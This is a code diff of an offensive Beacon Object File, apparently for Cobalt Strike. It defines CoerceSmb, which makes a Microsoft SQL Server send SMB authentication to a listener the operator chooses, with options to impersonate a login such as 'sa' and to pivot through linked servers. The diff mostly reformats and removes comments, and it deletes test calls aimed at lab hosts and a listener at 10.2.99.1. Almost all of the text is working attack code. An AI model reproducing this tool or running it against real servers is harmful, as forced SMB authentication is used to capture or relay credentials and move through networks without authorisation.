@@ -2,8 +2,7 @@
 #include "bofdefs.h"
 #include "sql.c"
 
-void CoerceSmb(char *server, char *database, char *link, char *impersonate,
-               char *listener, char *user, char *password) {
+void CoerceSmb(char *server, char *database, char *link, char *impersonate, char *listener, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -21,9 +20,6 @@ void CoerceSmb(char *server, char *database, char *link, char *impersonate,
     goto END;
   }
 
-  //
-  // allocate statement handle
-  //
   ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Error allocating statement handle\n");
@@ -35,17 +31,13 @@ void CoerceSmb(char *server, char *database, char *link, char *impersonate,
   char *suffix = "';";
 
   if (link == NULL) {
-    internal_printf("[*] Triggering SMB request to %s on %s\n\n", listener,
-                    server);
-    totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) +
-                MSVCRT$strlen(suffix) + 1;
+    internal_printf("[*] Triggering SMB request to %s on %s\n\n", listener, server);
+    totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
     query = (char *)intAlloc(totalSize * sizeof(char));
     MSVCRT$strcpy(query, prefix);
   } else {
-    internal_printf("[*] Triggering SMB request to %s on %s via %s\n\n",
-                    listener, link, server);
-    totalSize = MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) +
-                MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
+    internal_printf("[*] Triggering SMB request to %s on %s via %s\n\n", listener, link, server);
+    totalSize = MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
     query = (char *)intAlloc(totalSize * sizeof(char));
     MSVCRT$strcpy(query, linkPrefix);
     MSVCRT$strncat(query, prefix, totalSize - MSVCRT$strlen(linkPrefix) - 1);
@@ -54,9 +46,6 @@ void CoerceSmb(char *server, char *database, char *link, char *impersonate,
   MSVCRT$strncat(query, listener, totalSize - MSVCRT$strlen(linkPrefix) - 1);
   MSVCRT$strncat(query, suffix, totalSize - MSVCRT$strlen(linkPrefix) - 1);
 
-  //
-  // Run the query
-  //
   if (!HandleQuery(stmt, (SQLCHAR *)query, link, impersonate, TRUE)) {
     goto END;
   }
@@ -70,7 +59,6 @@ END:
   DisconnectSqlServer(env, dbc, stmt);
 }
 
-#ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *server;
   char *database;
@@ -80,9 +68,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *user;
   char *password;
 
-  //
-  // parse beacon args
-  //
   datap parser;
   BeaconDataParse(&parser, Buffer, Length);
 
@@ -113,21 +98,3 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
 
   printoutput(TRUE);
 };
-
-#else
-
-int main() {
-  internal_printf("============ BASE TEST ============\n\n");
-  CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, NULL,
-            "\\\\10.2.99.1", NULL, NULL);
-
-  internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-  CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, "sa",
-            "\\\\10.2.99.1", NULL, NULL);
-
-  internal_printf("\n\n============ LINK TEST ============\n\n");
-  CoerceSmb("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL,
-            "\\\\10.2.99.1", NULL, NULL);
-}
-
-#endif
